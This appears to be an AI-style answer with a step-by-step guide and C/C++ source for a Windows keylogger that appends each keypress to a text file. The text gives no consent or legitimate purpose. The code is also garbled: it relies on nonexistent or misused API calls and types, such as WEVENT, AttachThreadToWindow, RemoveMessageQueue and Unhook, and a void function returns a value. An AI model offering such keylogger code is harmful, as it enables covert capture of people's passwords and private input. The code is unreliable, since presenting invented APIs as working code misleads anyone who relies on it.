To create a keystroke-logging application on a Windows system, you can use the Windows API to set up a keyboard hook. Here's a step-by-step guide:

### Step-by-Step Explanation and Code

1. **Include Necessary Headers:**
   - Include `windows.h` and `winuser.h` for access to Windows API functions and structures.

2. **Define the Keyboard Event Handler:**
   - Create a function `keyboard_event_handler` that takes a window handle and an event structure, returning an integer.

3. **Set Up the Keyboard Hook:**
   - Use `SetWindowsHook` to install a global keyboard hook. This captures all keyboard events.

4. **Attach the Hook:**
   - Attach the event handler to the current thread.

5. **Process Messages:**
   - Use a loop to retrieve messages and check if they are keyboard events.

6. **Log Keystrokes:**
   - Extract the key value from the event and store it, perhaps in a text file.

7. **Cleanup:**
   - Detach the hook and clean up resources to prevent memory leaks.

Here's the code:

```c
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>

using namespace std;

void keyboard_event_handler(struct HWND hwnd, struct WEVENT *event) {
    if (event->wEvent == KEYDOWN) {
        // Convert to ASCII
        unsigned int key = static_cast<unsigned int>(event->wKey);
        // Append to file
        ofstream file("keystrokes.txt", fstream::app);
        file << static_cast<char>(key) << endl;
        file.close();
        return 0;
    }
    return 0;
}

int main() {
    // Define the keyboard hook function
    int (*pfnKeyboardHook)(HWND, WEVENT*) = keyboard_event_handler;

    // Set up the hook
    int hhook = SetWindowsHook(WH_KEYBOARD_LL, pfnKeyboardHook);
    if (hhook == 0) {
        cout << "Failed to set keyboard hook." << endl;
        return 1;
    }

    // Attach the hook to the current thread
    AttachThreadToWindow(GetCurrentThreadId(), hhook);

    // Process messages
    MSG msg;
    while (GetMessage(&msg, 0)) {
        if (msg.message == WM_KEYDOWN) {
            // The hook function will handle it
        }
    }

    // Clean up the hook
    Unhook(hhook);
    RemoveMessageQueue();

    return 0;
}
```

